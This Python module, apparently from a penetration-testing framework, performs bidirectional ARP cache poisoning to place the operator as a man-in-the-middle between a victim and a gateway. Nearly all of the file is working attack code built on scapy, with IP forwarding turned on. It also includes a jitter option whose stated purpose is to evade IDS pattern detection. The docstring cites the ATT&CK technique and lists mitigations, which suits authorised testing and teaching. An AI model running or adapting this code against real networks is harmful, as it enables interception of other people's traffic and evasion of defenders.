import random
"""
arp — ARP Spoofing / Cache Poisoning
ATT&CK: T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning)

Bidirectional poisoning (victim <-> gateway) with IP forwarding enabled, so the
operator sits inline as a transparent MITM. ARP tables are restored on exit to
avoid leaving the victim without connectivity.

Mitigation: Dynamic ARP Inspection (DAI) with DHCP snooping bindings; static
ARP for critical hosts; port security.
"""

import signal
import time

from scapy.all import ARP, send

from core.common import require_root, iface_mac, resolve_mac, set_ip_forward

NAME = "arp"
DESCRIPTION = "ARP cache poisoning MITM between victim and gateway"
ATTCK_ID = "T1557.002"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help="ARP cache poisoning MITM")
    p.add_argument("-i", "--iface", required=True, help="Interface, e.g. eth0")
    p.add_argument("-t", "--target", required=True, help="Victim IP")
    p.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    p.add_argument("--interval", type=float, default=2.0,
                   help="Seconds between re-poison rounds (default 2)")
    p.add_argument("--one-way", action="store_true",
                   help="Poison only the victim, not the gateway")
    p.add_argument("--jitter", type=float, default=0.0,
                   help="Max random jitter added to --interval (sec). "
                        "Breaks periodic pattern detected by IDS (default 0).")
    add_engagement_args(p)
    p.set_defaults(func=run)


def _restore(target_ip, target_mac, spoof_ip, spoof_mac, iface, count=5):
    """Send truthful ARP replies to heal the poisoned caches."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=spoof_ip, hwsrc=spoof_mac),
         count=count, iface=iface, verbose=False)


def run(args, logger):
    require_root()
    attacker_mac = iface_mac(args.iface)
    logger.info("ARP MITM | iface=%s attacker_mac=%s victim=%s gateway=%s",
                args.iface, attacker_mac, args.target, args.gateway)

    victim_mac = resolve_mac(args.target, args.iface)
    gateway_mac = resolve_mac(args.gateway, args.iface)
    if not victim_mac or not gateway_mac:
        logger.error("Could not resolve MAC(s). Check IPs / L2 reachability.")
        return 1

    logger.info("Resolved victim_mac=%s gateway_mac=%s", victim_mac, gateway_mac)
    set_ip_forward(True)
    logger.info("IPv4 forwarding enabled (transparent MITM).")

    bidirectional = not args.one_way

    def cleanup(_signum=None, _frame=None):
        logger.info("Restoring ARP tables...")
        _restore(args.target, victim_mac, args.gateway, gateway_mac, args.iface)
        _restore(args.gateway, gateway_mac, args.target, victim_mac, args.iface)
        set_ip_forward(False)
        logger.info("ARP MITM stopped and cleaned up.")
        raise SystemExit(0)

    signal.signal(signal.SIGINT, cleanup)

    sent = 0
    while True:
        # Tell the victim: "I am the gateway"
        send(ARP(op=2, pdst=args.target, hwdst=victim_mac,
                 psrc=args.gateway, hwsrc=attacker_mac),
             iface=args.iface, verbose=False)
        # Tell the gateway: "I am the victim" (full 2-way MITM)
        if bidirectional:
            send(ARP(op=2, pdst=args.gateway, hwdst=gateway_mac,
                     psrc=args.target, hwsrc=attacker_mac),
                 iface=args.iface, verbose=False)
        sent += 1
        if sent % 10 == 0:
            logger.info("Sent %d spoofed ARP pairs...", sent)
        _jitter = random.uniform(0, args.jitter) if hasattr(args, "jitter") and args.jitter else 0
        time.sleep(args.interval + _jitter)
